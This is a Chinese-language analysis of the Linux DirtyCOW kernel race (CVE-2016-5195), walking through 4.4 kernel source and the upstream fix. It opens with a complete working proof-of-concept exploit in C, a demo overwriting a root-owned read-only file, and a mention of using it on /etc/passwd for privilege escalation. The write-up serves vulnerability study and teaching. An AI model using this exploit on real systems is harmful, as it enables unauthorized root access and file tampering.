# CVE-2016-5195 DirtyCOW

## PoC

- 修改自[dirtycow.github.io](https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c)

```c
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
  char *str;
  str = (char*)arg;
  int i, c = 0;
  for(i = 0; i < 100000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

void *procselfmemThread(void *arg) {
  char *str;
  str = (char*)arg;

  int f = open("/proc/self/mem", O_RDWR);
  int i, c = 0;
  for(i = 0; i < 100000000; i++) {
    lseek(f, (uintptr_t)map, SEEK_SET);
    c += write(f, str, strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}

int main(int argc, char *argv[]) {
  if (argc < 3) {
      (void)fprintf(stderr, "%s\n", "usage: dirtyc0w target_file new_content");
      return 1;
  }
  pthread_t pth1, pth2;

  f = open(argv[1], O_RDONLY);
  fstat(f, &st);
  name = argv[1];

  map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
  printf("mmap %zx\n\n", (uintptr_t)map);

  pthread_create(&pth1, NULL, madviseThread, argv[1]);
  pthread_create(&pth2, NULL, procselfmemThread, argv[2]);

  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}
```

```
$ sudo su
# echo "READ ONLY" > flag.txt
# chmod 0404 flag.txt
# exit
$
$ ll flag.txt 
-r-----r-- 1 root root 10 flag.txt
$ echo "aaaaaa" > flag.txt
Permission Denied
$
$ gcc -pthread dirty.c -o dirty
$ ./dirty flag.txt aaaaaa
mmap 7f1a35bc4000

procselfmem -2094967296

madvise 0
$ cat flag.txt
aaaaaa
```

比较常见的利用手法是越权写`/etc/passwd`修改 root 用户或修改用户权限来提权

## Analysis

### Exploit Analysis

先来看看 exp 做了什么

```c
int main(int argc, char *argv[]) {
  if (argc < 3) {
  	(void)fprintf(stderr, "%s\n","usage: dirtyc0w target_file new_content");
	return 1; 
  }
    
  pthread_t pth1, pth2;
  f = open(argv[1], O_RDONLY);
  fstat(f, &st);
  name = argv[1];

  map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
  printf("mmap %zx\n\n", (uintptr_t)map);

  pthread_create(&pth1, NULL, madviseThread, argv[1]);
  pthread_create(&pth2, NULL, procselfmemThread, argv[2]);

  pthread_join(pth1, NULL);
  pthread_join(pth2, NULL);
  return 0;
}
```

- 首先调 pthread 建两个线程
- 然后`fopen`打开只读的目标文件`argv[1]`
- 将文件`mmap`到内存（地址随机），`MAP_PRIVATE`的作用是建立一个 Task 私有的内存映射，如果有别的 Task 尝试写入这篇内存，该进程在写入前会先复制出一份拷贝再进行写入，从而在实现在起子进程或起线程时无需花费大量时间空间拷贝整个内存空间，又能保证 Task 间的并发内存操作互不影响，这就是 CopyOnWrite
- 随后启动两个线程，一个执行`madviseThread`，一个执行`procselfmemThread`

然后看看两个线程的执行体

- 一个线程对文件映射调用`madvise`告诉内核映射的内存或者共享内存的使用情况，`MADV_DONTNEED`表示接下来不再使用这块内存区域，内核可以释放它
- 另一个线程以读写权限打开`/proc/self/mem`，这个文件是进程自身的虚拟内存的文件映射，然后不断尝试向文件写入目标信息

```c
void *madviseThread(void *arg) {
  char *str;
  str = (char*)arg;
  int i, c = 0;
  for(i = 0; i < 100000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}
 
void *procselfmemThread(void *arg) {
  char *str;
  str = (char*)arg;

  int f = open("/proc/self/mem", O_RDWR);
  int i, c = 0;
  for(i = 0; i < 100000000; i++) {
    lseek(f, (uintptr_t)map, SEEK_SET);
    c += write(f, str, strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
```

最终，在两个线程的轮番轰炸下内核出现竞争漏洞，`procselfmemThread`成功写入只读文件

### Kernel Analysis

- 大前提：`mmap`只会在 vma 上建立内存映射，但不会真的将映射文件放进物理页框。因此当我们第一次尝试`write`文件时必然会触发缺页异常
- 这里选择的 kernel 版本是 4.4

#### What happens when we write

##### mem_rw

我们从`write`开始分析。对文件的任何操作都要走文件所在的文件系统在 VFS 上注册好的虚表`file_operations`，而`/proc`上的文件是由 procfs 实现的，找到`proc_mem_operations`，可以看到`write`会被绑定倒`mem_write`上

```c
static const struct file_operations proc_mem_operations = {
	.llseek		= mem_lseek,
	.read		= mem_read,
	.write		= mem_write,
	.open		= mem_open,
	.release	= mem_release,
};
```

`mem_write`是对`mem_rw`的一个 wrap（`write`标志置为 1），`mem_rw`的主要流程是

- 首先`__get_free_page`申请一个临时的空闲页充当缓冲区
- 若为写操作，调用`copy_from_user`将待写的数据拷贝到临时页
- 然后`access_remote_vm`读取目标数据到空闲页（读）或将缓冲区的内容写到目标地址（写）
  - 所谓 remote，其实是因为本进程有可能会去读写其他进程的内存映射文件，也就代表了进程可能会去访问其他进程的地址空间，这点和其他 memory filesystem 不同
- 若为读操作，那么将上一步读到空闲页的数据写回用户的缓冲区中

```c
static ssize_t mem_rw(struct file *file, char __user *buf,
			size_t count, loff_t *ppos, int write)
{
	struct mm_struct *mm = file->private_data;
	unsigned long addr = *ppos;
	ssize_t copied;
	char *page;

	if (!mm)
		return 0;

	page = (char *)__get_free_page(GFP_TEMPORARY);	// 申请临时空闲页面
	if (!page)
		return -ENOMEM;

	copied = 0;
	if (!atomic_inc_not_zero(&mm->mm_users))
		goto free;

	while (count > 0) {
		int this_len = min_t(int, count, PAGE_SIZE);	// 本次读取/写入数据长度，单次最大为PAGE_SIZE

		if (write && copy_from_user(page, buf, this_len)) {		// 若是写操作，从用户空间拷贝待写数据到临时空闲页面
			copied = -EFAULT;
			break;
		}

		this_len = access_remote_vm(mm, addr, page, this_len, write);	// 读取/写入数据到临时空闲页面
		if (!this_len) {
			if (!copied)
				copied = -EIO;
			break;
		}

		if (!write && copy_to_user(buf, page, this_len)) {	// 若是读操作，将读取到的数据从临时空闲页面拷贝数据到用户空间
			copied = -EFAULT;
			break;
		}

		buf += this_len;
		addr += this_len;
		copied += this_len;
		count -= this_len;
	}
	*ppos = addr;

	mmput(mm);
free:
	free_page((unsigned long) page);	// 释放临时空闲页面
	return copied;
}
```

##### __access_remote_vm

`access_remote_vm`是对`__access_remote_vm`的 wrap，主要流程是

- `get_user_pages`获取地址目标`addr`所在的 page struct
- 若获取成功，调用`kmap`将 page 映射进内核的 high memory（page 所指代的是物理页面）
- 若内存访问是写操作，那就将数据写入后置脏位，若是读操作就将数据读入即可

```c
static int __access_remote_vm(struct task_struct *tsk, struct mm_struct *mm,
		unsigned long addr, void *buf, int len, int write)
{
	struct vm_area_struct *vma;
	void *old_buf = buf;

	down_read(&mm->mmap_sem);
	/* ignore errors, just check how much was successfully transferred */
	while (len) {
		int bytes, ret, offset;
		void *maddr;
		struct page *page = NULL;

		ret = get_user_pages(tsk, mm, addr, 1,		// 获取addr对应的page
				write, 1, &page, &vma);
		if (ret <= 0) {		// 获取失败
#ifndef CONFIG_HAVE_IOREMAP_PROT
			break;
#else
			/*
			 * Check if this is a VM_IO | VM_PFNMAP VMA, which
			 * we can access using slightly different code.
			 */
			vma = find_vma(mm, addr);
			if (!vma || vma->vm_start > addr)
				break;
			if (vma->vm_ops && vma->vm_ops->access)
				ret = vma->vm_ops->access(vma, addr, buf,
							  len, write);
			if (ret <= 0)
				break;
			bytes = ret;
#endif
		} else {	// 获取成功
			bytes = len;
			offset = addr & (PAGE_SIZE-1);
			if (bytes > PAGE_SIZE-offset)
				bytes = PAGE_SIZE-offset;

			maddr = kmap(page);		// 映射page到内核空间，因为我们获取的是page结构体，需要映射到一个虚拟地址之后才能进行写入
			if (write) {	// 如果是写操作
				copy_to_user_page(vma, page, addr,		// 将buf的数据拷贝到page中，完成写入
						  maddr + offset, buf, bytes);
				set_page_dirty_lock(page);	// 设置页面为脏页
			} else {		// 如果是读操作
				copy_from_user_page(vma, page, addr,
						    buf, maddr + offset, bytes);
			}
			kunmap(page);
			page_cache_release(page);
		}
		len -= bytes;
		buf += bytes;
		addr += bytes;
	}
	up_read(&mm->mmap_sem);

	return buf - old_buf;
}
```

##### __get_user_pages

以上就是 procfs 读写操作的 overview 了。下面我们从`get_user_pages`开始切入

`get_user_pages`是`__get_user_pages_locked`的 wrap，而后者调用了`__get_user_pages`才是逻辑主体，其流程如下

- 首先遍历要操作的页面并做一些前期准备，包括设置每个页面的权限位图`foll_flags`
- 若为第一次迭代或起始地址大于当前 vma 基址，`find_extend_vma`获取起始地址所在的 vma
- 若进程没有收到或屏蔽致命信号，`follow_page_mask`获取虚拟地址对应的物理页的 page struct
  - 通常页面都不在内存中，即第一次访问页面会造成缺页
  - 另外，若没有对该页面的操作权限，同样会引起异常
  - 此外还有 OOM、硬件故障等其他原因，这里不关心
- 若没能获取成功且不是故障（返回 0），调用`faultin_page`处理缺页异常。完成处理成功后跳回`follow_page_mask`重试页面获取

```c
long __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,
		unsigned long start, unsigned long nr_pages,
		unsigned int gup_flags, struct page **pages,
		struct vm_area_struct **vmas, int *nonblocking)
{
	long i = 0;
	unsigned int page_mask;
	struct vm_area_struct *vma = NULL;

	if (!nr_pages)
		return 0;

	VM_BUG_ON(!!pages != !!(gup_flags & FOLL_GET));

	/*
	 * If FOLL_FORCE is set then do not force a full fault as the hinting
	 * fault information is unrelated to the reference behaviour of a task
	 * using the address space
	 */
	if (!(gup_flags & FOLL_FORCE))
		gup_flags |= FOLL_NUMA;

	do {
		struct page *page;
		unsigned int foll_flags = gup_flags;
		unsigned int page_increm;

		/* first iteration or cross vma bound */
		if (!vma || start >= vma->vm_end) {		// 若vma为空（第一次迭代）或者start超出vma的范围
			vma = find_extend_vma(mm, start);	// 查找start所在的vma
			if (!vma && in_gate_area(mm, start)) {
				int ret;
				ret = get_gate_page(mm, start & PAGE_MASK,
						gup_flags, &vma,
						pages ? &pages[i] : NULL);
				if (ret)
					return i ? : ret;
				page_mask = 0;
				goto next_page;
			}

			if (!vma || check_vma_flags(vma, gup_flags))
				return i ? : -EFAULT;
			if (is_vm_hugetlb_page(vma)) {
				i = follow_hugetlb_page(mm, vma, pages, vmas,
						&start, &nr_pages, i,
						gup_flags);
				continue;
			}
		}
retry:
		/*
		 * If we have a pending SIGKILL, don't keep faulting pages and
		 * potentially allocating memory.
		 */
		if (unlikely(fatal_signal_pending(current)))
			return i ? i : -ERESTARTSYS;
		cond_resched();
		page = follow_page_mask(vma, start, foll_flags, &page_mask);	// 获取虚拟地址对应的物理页的page struct
		if (!page) {	// 获取失败，可能是没有对应页，也可能是没有相应操作权限
			int ret;
			ret = faultin_page(tsk, vma, start, &foll_flags,	// 处理缺页异常，COW机制建映射得到一个新的可写的anon page
					nonblocking);								// 若没有写权限其会取消掉foll_flags中的写标志并返回0
			switch (ret) {
			case 0:		// 缺页异常处理成功，重新尝试获取page
				goto retry;
			case -EFAULT:
			case -ENOMEM:
			case -EHWPOISON:
				return i ? i : ret;
			case -EBUSY:
				return i;
			case -ENOENT:
				goto next_page;
			}
			BUG();
		} else if (PTR_ERR(page) == -EEXIST) {
			/*
			 * Proper page table entry exists, but no corresponding
			 * struct page.
			 */
			goto next_page;
		} else if (IS_ERR(page)) {
			return i ? i : PTR_ERR(page);
		}
		if (pages) {
			pages[i] = page;
			flush_anon_page(vma, page, start);
			flush_dcache_page(page);
			page_mask = 0;
		}
next_page:
		if (vmas) {
			vmas[i] = vma;
			page_mask = 0;
		}
		page_increm = 1 + (~(start >> PAGE_SHIFT) & page_mask);
		if (page_increm > nr_pages)
			page_increm = nr_pages;
		i += page_increm;
		start += page_increm * PAGE_SIZE;
		nr_pages -= page_increm;
	} while (nr_pages);		// 直到所有的页都处理完毕
	return i;
}
EXPORT_SYMBOL(__get_user_pages);
```

##### follow_page_mask

`follow_page_mask`会一步步解析地址得到所在的 pte，然后调用`follow_page_pte`尝试获取 page struct，逻辑比较简单，就是一顿检查通过后返回 page struct，并且可见找不到地址映射以及无写权限都会返回 NULL

```c
static struct page *follow_page_pte(struct vm_area_struct *vma,
		unsigned long address, pmd_t *pmd, unsigned int flags)
{
	struct mm_struct *mm = vma->vm_mm;
	struct page *page;
	spinlock_t *ptl;
	pte_t *ptep, pte;

retry:
	if (unlikely(pmd_bad(*pmd)))
		return no_page_table(vma, flags);

	ptep = pte_offset_map_lock(mm, pmd, address, &ptl);
	pte = *ptep;
	if (!pte_present(pte)) {
		swp_entry_t entry;
		/*
		 * KSM's break_ksm() relies upon recognizing a ksm page
		 * even while it is being migrated, so for that case we
		 * need migration_entry_wait().
		 */
		if (likely(!(flags & FOLL_MIGRATION)))
			goto no_page;
		if (pte_none(pte))
			goto no_page;
		entry = pte_to_swp_entry(pte);
		if (!is_migration_entry(entry))
			goto no_page;
		pte_unmap_unlock(ptep, ptl);
		migration_entry_wait(mm, pmd, address);
		goto retry;
	}
	if ((flags & FOLL_NUMA) && pte_protnone(pte))
		goto no_page;
	if ((flags & FOLL_WRITE) && !pte_write(pte)) {	// 欲执行写操作，但是没有写权限
		pte_unmap_unlock(ptep, ptl);
		return NULL;
	}

	page = vm_normal_page(vma, address, pte);	// 获取page struct
	if (unlikely(!page)) {
		if (flags & FOLL_DUMP) {
			/* Avoid special (like zero) pages in core dumps */
			page = ERR_PTR(-EFAULT);
			goto out;
		}

		if (is_zero_pfn(pte_pfn(pte))) {
			page = pte_page(pte);
		} else {
			int ret;

			ret = follow_pfn_pte(vma, address, ptep, flags);
			page = ERR_PTR(ret);
			goto out;
		}
	}

	if (flags & FOLL_GET)
		get_page_foll(page);
	if (flags & FOLL_TOUCH) {
		if ((flags & FOLL_WRITE) &&
		    !pte_dirty(pte) && !PageDirty(page))
			set_page_dirty(page);
		/*
		 * pte_mkyoung() would be more correct here, but atomic care
		 * is needed to avoid losing the dirty bit: it is easier to use
		 * mark_page_accessed().
		 */
		mark_page_accessed(page);
	}
	if ((flags & FOLL_MLOCK) && (vma->vm_flags & VM_LOCKED)) {
		/*
		 * The preliminary mapping check is mainly to avoid the
		 * pointless overhead of lock_page on the ZERO_PAGE
		 * which might bounce very badly if there is contention.
		 *
		 * If the page is already locked, we don't need to
		 * handle it now - vmscan will handle it later if and
		 * when it attempts to reclaim the page.
		 */
		if (page->mapping && trylock_page(page)) {
			lru_add_drain();  /* push cached pages to LRU */
			/*
			 * Because we lock page here, and migration is
			 * blocked by the pte's page reference, and we
			 * know the page is still mapped, we don't even
			 * need to check for file-cache page truncation.
			 */
			mlock_vma_page(page);
			unlock_page(page);
		}
	}
out:
	pte_unmap_unlock(ptep, ptl);
	return page;
no_page:
	pte_unmap_unlock(ptep, ptl);
	if (!pte_none(pte))
		return NULL;
	return no_page_table(vma, flags);
}
```

##### faultin_page

`faultin_page`类似，设置好标志之后调用`handle_mm_fault`正式进入缺页异常处理流程，这个会在后面展开

```c
static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,
		unsigned long address, unsigned int *flags, int *nonblocking)
{
	struct mm_struct *mm = vma->vm_mm;
	unsigned int fault_flags = 0;
	int ret;

	/* mlock all present pages, but do not fault in new pages */
	if ((*flags & (FOLL_POPULATE | FOLL_MLOCK)) == FOLL_MLOCK)
		return -ENOENT;
	/* For mm_populate(), just skip the stack guard page. */
	if ((*flags & FOLL_POPULATE) &&
			(stack_guard_page_start(vma, address) ||
			 stack_guard_page_end(vma, address + PAGE_SIZE)))
		return -ENOENT;
	if (*flags & FOLL_WRITE)	// 欲执行写操作
		fault_flags |= FAULT_FLAG_WRITE;
	if (nonblocking)
		fault_flags |= FAULT_FLAG_ALLOW_RETRY;
	if (*flags & FOLL_NOWAIT)
		fault_flags |= FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_RETRY_NOWAIT;
	if (*flags & FOLL_TRIED) {
		VM_WARN_ON_ONCE(fault_flags & FAULT_FLAG_ALLOW_RETRY);
		fault_flags |= FAULT_FLAG_TRIED;
	}

	ret = handle_mm_fault(mm, vma, address, fault_flags);	// 处理缺页异常
	if (ret & VM_FAULT_ERROR) {
		if (ret & VM_FAULT_OOM)
			return -ENOMEM;
		if (ret & (VM_FAULT_HWPOISON | VM_FAULT_HWPOISON_LARGE))
			return *flags & FOLL_HWPOISON ? -EHWPOISON : -EFAULT;
		if (ret & (VM_FAULT_SIGBUS | VM_FAULT_SIGSEGV))
			return -EFAULT;
		BUG();
	}

	if (tsk) {
		if (ret & VM_FAULT_MAJOR)
			tsk->maj_flt++;
		else
			tsk->min_flt++;
	}

	if (ret & VM_FAULT_RETRY) {
		if (nonblocking)
			*nonblocking = 0;
		return -EBUSY;
	}

	/*
	 * The VM_FAULT_WRITE bit tells us that do_wp_page has broken COW when
	 * necessary, even if maybe_mkwrite decided not to set pte_write. We
	 * can thus safely do subsequent page lookups as if they were reads.
	 * But only do so when looping for pte_write is futile: in some cases
	 * userspace may also be wanting to write to the gotten user page,
	 * which a read fault here might prevent (a readonly page might get
	 * reCOWed by userspace write).
	 */
	if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))	// 若vma不可写，但是缺页异常处理成功，且需要写操作
		*flags &= ~FOLL_WRITE;	// 清除写操作标志，否则会在__get_user_pages中返回不断retry
	return 0;
}
```

#### DirtyCOW

##### Handling Page Fault

`__get_user_pages`中`retry`标签中表示的重试机制其实就是访存时缺页异常的大致处理流程，以本文场景为例，注意这里的操作不是原子的

1. 第一次
   1. Task 第一次访问`mmap`将文件映射进的地址，由于`mmap`不会将页面读进内存，`follow_page_mask`获取页面失败造成第一次缺页异常
   2. `faultin_page`将页面读入内存，建好映射，返回后 retry
2. 第二次
   1. `follow_page_mask`第二次获取页面，获取的操作包含了写页面，而目标页面是只读的，获取失败造成第二次缺页异常
   2. `faultin_page`根据 COW 机制，拷贝出一份匿名页面，重建映射，并消除掉`FOLL_WRITE`标志避免无穷尽地 retry，最后返回 retry
3. 第三次
   1. `follow_page_mask`第三次获取页面，这次它的写标志被消除掉了，所以这次以只读的权限成功获取到 COW 拷贝出的匿名页面，没有再引发异常
   2. 返回到`kmap`，进程完成写入（但更改不会被同步到文件中）

##### How does DirtyCOW run

到了这里其实漏洞点已经比较明确了，三次缺页处理的`retry`部分本应是原子的，至少应该给 pte 加锁，但实际上这里不知是出于何种考虑这里并没有进行保护，导致这段执行流很容易被破坏。DirtyCOW 就是在完成上面的流程同时不断调用`madvice`尝试让内核清零 pte 以解除目标页面的映射，最终导致以下执行流

1. 第一次
   1. Task 第一次访问`mmap`将文件映射进的地址，由于`mmap`不会将页面读进内存，`follow_page_mask`获取页面失败造成第一次缺页异常
   2. `faultin_page`将页面读入内存，建好映射，返回后 retry
2. 第二次
   1. `follow_page_mask`第二次获取页面，获取的操作包含了写页面，而目标页面是只读的，获取失败造成第二次缺页异常
   2. `faultin_page`根据 COW 机制，拷贝出一份匿名页面，重建映射，并消除掉`FOLL_WRITE`标志避免无穷尽地 retry，最后返回 retry
3. 竞争：此时内核在`madvice`的建议下清空虚拟地址所在的 pte 解除了虚拟地址映射（同进程下的线程之间共享同一份页表）
4. 第三次
   1. `follow_page_mask`第三次获取页面，这次它的写标志被消除掉了，所以这次以只读的权限尝试获取，同时页面被解除了映射，又引发缺页异常
   2. 因为这次权限是只读，所以`faultin_page`成功将目标页面读入内存并建立了映射，而非像正常情况一样 COW 拷贝出一份匿名页面，返回 retry
5. 第四次
   1. `follow_page_mask`第四次获取页面，这次成功获取到目标页面，没有再引发异常
   2. 返回到`kmap`，进程完成写入，页面置脏位，最终更改表内同步到文件中，完成越权写入

剩下一个可能会感到疑惑的点是，就算我们拿到了页面，但原来的 vma 还是只读的，最后也没法完成写入。这个问题的解决根本似乎是`kmap`会把内存映射进内核的 high memory，即使用户态 vma 映射的 pte 是只读的，但内核态的 high memory 映射的 pte 却有写权限，借由它我们可以顺利完成越权写入，这也是`mem_write`特有的特性

##### To be a good COW

最后看看 Linus 的 patch，可能是出于性能考虑，他并未在漏洞点进行加锁，而是重新设置了一个`FOLL_COW`标签来对 COW 进行特殊处理

- commit：[mm: remove gup_flags FOLL_WRITE games from __get_user_pages()](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619)

```diff
diff --git a/include/linux/mm.h b/include/linux/mm.h
index e9caec6a51e97a..ed85879f47f5f7 100644
--- a/include/linux/mm.h
+++ b/include/linux/mm.h
@@ -2232,6 +2232,7 @@ static inline struct page *follow_page(struct vm_area_struct *vma,
 #define FOLL_TRIED	0x800	/* a retry, previous pass started an IO */
 #define FOLL_MLOCK	0x1000	/* lock present pages */
 #define FOLL_REMOTE	0x2000	/* we are working on non-current tsk/mm */
+#define FOLL_COW	0x4000	/* internal GUP flag */
 
 typedef int (*pte_fn_t)(pte_t *pte, pgtable_t token, unsigned long addr,
 			void *data);
diff --git a/mm/gup.c b/mm/gup.c
index 96b2b2fd0fbd13..22cc22e7432f60 100644
--- a/mm/gup.c
+++ b/mm/gup.c
@@ -60,6 +60,16 @@ static int follow_pfn_pte(struct vm_area_struct *vma, unsigned long address,
 	return -EEXIST;
 }
 
+/*
+ * FOLL_FORCE can write to even unwritable pte's, but only
+ * after we've gone through a COW cycle and they are dirty.
+ */
+static inline bool can_follow_write_pte(pte_t pte, unsigned int flags)
+{
+	return pte_write(pte) ||
+		((flags & FOLL_FORCE) && (flags & FOLL_COW) && pte_dirty(pte));
+}
+
 static struct page *follow_page_pte(struct vm_area_struct *vma,
 		unsigned long address, pmd_t *pmd, unsigned int flags)
 {
@@ -95,7 +105,7 @@ retry:
 	}
 	if ((flags & FOLL_NUMA) && pte_protnone(pte))
 		goto no_page;
-	if ((flags & FOLL_WRITE) && !pte_write(pte)) {
+	if ((flags & FOLL_WRITE) && !can_follow_write_pte(pte, flags)) {
 		pte_unmap_unlock(ptep, ptl);
 		return NULL;
 	}
@@ -412,7 +422,7 @@ static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,
 	 * reCOWed by userspace write).
 	 */
 	if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
-		*flags &= ~FOLL_WRITE;
+	        *flags |= FOLL_COW;
 	return 0;
 }
```

#### Dive into Page Fault

##### handle_mm_fault

前面我们在`faultin_page`停下了，现在我们继续从`handle_mm_fault`开始继续深入

```c
int handle_mm_fault(struct mm_struct *mm, struct vm_area_struct *vma,
		    unsigned long address, unsigned int flags)
{
	int ret;

	__set_current_state(TASK_RUNNING);	// 在处理完缺页异常后进程需要继续运行，保持TASK_RUNNING状态

	count_vm_event(PGFAULT);
	mem_cgroup_count_vm_event(mm, PGFAULT);

	/* do counter updates before entering really critical section. */
	check_sync_rss_stat(current);

	/*
	 * Enable the memcg OOM handling for faults triggered in user
	 * space.  Kernel faults are handled more gracefully.
	 */
	if (flags & FAULT_FLAG_USER)
		mem_cgroup_oom_enable();	// 使能内存控制组的OOM处理

	ret = __handle_mm_fault(mm, vma, address, flags);	// handle的真正入口

	if (flags & FAULT_FLAG_USER) {	// 如果是用户态的缺页异常
		mem_cgroup_oom_disable();	// 禁用内存控制组的OOM处理
                /*
                 * The task may have entered a memcg OOM situation but
                 * if the allocation error was handled gracefully (no
                 * VM_FAULT_OOM), there is no need to kill anything.
                 * Just clean up the OOM state peacefully.
                 */
                if (task_in_memcg_oom(current) && !(ret & VM_FAULT_OOM))	// 如果进程处于内存控制组的OOM状态，但没有OOM错误
                        mem_cgroup_oom_synchronize(false);	// 清理OOM状态即可
	}

	return ret;
}
EXPORT_SYMBOL_GPL(handle_mm_fault);
```

##### __handle_mm_fault

再看到 wrap 的`__handle_mm_fault`，其实就是解析出目标所在的 pte，然后调用`handle_pte_fault`处理

```c
static int __handle_mm_fault(struct mm_struct *mm, struct vm_area_struct *vma,
			     unsigned long address, unsigned int flags)
{
	pgd_t *pgd;	// 页全局目录指针
	pud_t *pud;	// 页上级目录指针
	pmd_t *pmd;	// 页中间目录指针
	pte_t *pte;	// 页表项指针

	if (unlikely(is_vm_hugetlb_page(vma)))	// hugepage
		return hugetlb_fault(mm, vma, address, flags);

	pgd = pgd_offset(mm, address);		// (mm)->pgd + (address)>>PGDIR_SHIFT
	pud = pud_alloc(mm, pgd, address);	// 获取pud指针
	if (!pud)
		return VM_FAULT_OOM;	// out of memory
	pmd = pmd_alloc(mm, pud, address);	// 获取pmd指针
	if (!pmd)
		return VM_FAULT_OOM;
	if (pmd_none(*pmd) && transparent_hugepage_enabled(vma)) {	// 透明大页
		int ret = create_huge_pmd(mm, vma, address, pmd, flags);
		if (!(ret & VM_FAULT_FALLBACK))
			return ret;
	} else {
		pmd_t orig_pmd = *pmd;
		int ret;

		barrier();	// 内存屏障，确保orig_pmd的读取顺序不会被编译器优化，保证读取的是最新的pmd值
		if (pmd_trans_huge(orig_pmd)) {		// 透明大页
			unsigned int dirty = flags & FAULT_FLAG_WRITE;

			/*
			 * If the pmd is splitting, return and retry the
			 * the fault.  Alternative: wait until the split
			 * is done, and goto retry.
			 */
			if (pmd_trans_splitting(orig_pmd))
				return 0;

			if (pmd_protnone(orig_pmd))
				return do_huge_pmd_numa_page(mm, vma, address,
							     orig_pmd, pmd);

			if (dirty && !pmd_write(orig_pmd)) {
				ret = wp_huge_pmd(mm, vma, address, pmd,
							orig_pmd, flags);
				if (!(ret & VM_FAULT_FALLBACK))
					return ret;
			} else {
				huge_pmd_set_accessed(mm, vma, address, pmd,
						      orig_pmd, dirty);
				return 0;
			}
		}
	}

	/*
	 * Use __pte_alloc instead of pte_alloc_map, because we can't
	 * run pte_offset_map on the pmd, if an huge pmd could
	 * materialize from under us from a different thread.
	 */
	if (unlikely(pmd_none(*pmd)) &&
	    unlikely(__pte_alloc(mm, vma, pmd, address)))
		return VM_FAULT_OOM;
	/*
	 * If a huge pmd materialized under us just retry later.  Use
	 * pmd_trans_unstable() instead of pmd_trans_huge() to ensure the pmd
	 * didn't become pmd_trans_huge under us and then back to pmd_none, as
	 * a result of MADV_DONTNEED running immediately after a huge pmd fault
	 * in a different thread of this mm, in turn leading to a misleading
	 * pmd_trans_huge() retval.  All we have to ensure is that it is a
	 * regular pmd that we can walk with pte_offset_map() and we can do that
	 * through an atomic read in C, which is what pmd_trans_unstable()
	 * provides.
	 */
	if (unlikely(pmd_trans_unstable(pmd)))
		return 0;
	/*
	 * A regular pmd is established and it can't morph into a huge pmd
	 * from under us anymore at this point because we hold the mmap_sem
	 * read mode and khugepaged takes it in write mode. So now it's
	 * safe to run pte_offset_map().
	 */
	pte = pte_offset_map(pmd, address);		// 获取pte指针，这也是这个wrap的最终的目标

	return handle_pte_fault(mm, vma, address, pte, pmd, flags);		// 进入page fault处理
}
```

##### handle_pte_fault

`handle_pte_fault`流程如下，关键函数是`do_fault`和`do_wp_page`

- 首先判断 pte 是否为空，是则表明进程是第一次访问该页面
  - 若访问的是匿名页面则调用`do_anonymous_page`
  - 若访问的是非匿名页面则调用`do_fault`
  - 做完这些直接返回
- 若在内存中（表明此前已经访问过页面），那么做完一些检查后，若 page fault 是由写操作引发的
  - 若没有写权限，就调用`do_wp_page`
  - 若有写权限，那就给 pte 置脏位

```c
static int handle_pte_fault(struct mm_struct *mm,
		     struct vm_area_struct *vma, unsigned long address,
		     pte_t *pte, pmd_t *pmd, unsigned int flags)
{
	pte_t entry;
	spinlock_t *ptl;	// 页表自旋锁

	/*
	 * some architectures can have larger ptes than wordsize,
	 * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,
	 * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.
	 * The code below just needs a consistent view for the ifs and
	 * we later double check anyway with the ptl lock held. So here
	 * a barrier will do.
	 */
	entry = *pte;
	barrier();
	if (!pte_present(entry)) {	// 页表项不在内存中（page fault第一次）
		if (pte_none(entry)) {	// 页表项为空，进程第一次访问该页面
			if (vma_is_anonymous(vma))	// 没有设置vma->vm_ops，即为匿名页面（即不是文件映射）
				return do_anonymous_page(mm, vma, address,
							 pte, pmd, flags);
			else
				return do_fault(mm, vma, address, pte, pmd,		// 若为文件映射页面
						flags, entry);
		}
		return do_swap_page(mm, vma, address,	// 页表项不为空，将页面swap进内存
					pte, pmd, flags, entry);
	}

	if (pte_protnone(entry))	// 页表项为保护页
		return do_numa_page(mm, vma, address, entry, pte, pmd);	// NUMA

	ptl = pte_lockptr(mm, pmd);	// 页表自旋锁，此时页面已经在内存中
	spin_lock(ptl);
	if (unlikely(!pte_same(*pte, entry)))	// 并发检查
		goto unlock;
	if (flags & FAULT_FLAG_WRITE) {	// page fault是由写操作引发
		if (!pte_write(entry))		// 页不可写
			return do_wp_page(mm, vma, address,	// COW
					pte, pmd, ptl, entry);
		entry = pte_mkdirty(entry);	// 页可写，设置为脏页
	}
	entry = pte_mkyoung(entry);
	if (ptep_set_access_flags(vma, address, pte, entry, flags & FAULT_FLAG_WRITE)) {
		update_mmu_cache(vma, address, pte);
	} else {
		/*
		 * This is needed only for protection faults but the arch code
		 * is not yet telling us if this is a protection fault or not.
		 * This still avoids useless tlb flushes for .text page faults
		 * with threads.
		 */
		if (flags & FAULT_FLAG_WRITE)
			flush_tlb_fix_spurious_fault(vma, address);
	}
unlock:
	pte_unmap_unlock(pte, ptl);
	return 0;
}
```

##### do_fault

因为这次主要关心 COW，所以我们选择从`do_fault`继续深入

- 首先定位发生缺页异常的位置在文件的第几页（前面确认了页面是文件映射而来）
- 确认有在`vma->vmops`中定义缺页异常处理函数
- 若是读操作，调用`do_read_fault`
